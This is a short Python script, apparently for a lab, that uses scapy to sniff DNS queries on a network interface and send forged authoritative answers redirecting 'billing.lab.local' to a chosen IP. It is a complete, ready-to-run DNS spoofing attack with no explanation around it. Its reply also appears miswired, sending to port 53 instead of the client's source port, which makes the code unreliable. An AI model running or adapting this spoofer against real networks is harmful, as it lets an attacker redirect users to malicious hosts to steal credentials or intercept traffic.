from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR

FAKE_IP = "192.168.1.10"
TARGET = "billing.lab.local."

def handle_pkt(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode(errors="ignore")
        if TARGET in qname:
            reply = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src)
                / UDP(sport=pkt[UDP].dport, dport=53)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNSQR],
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=30, rdata=FAKE_IP),
                )
            )
            send(reply, verbose=False)
            print(f"[+] Forged DNS answer: {qname} -> {FAKE_IP}", flush=True)

print("[*] Listening for DNS queries on eth0...")
sniff(iface="eth0", filter="udp port 53", prn=handle_pkt)
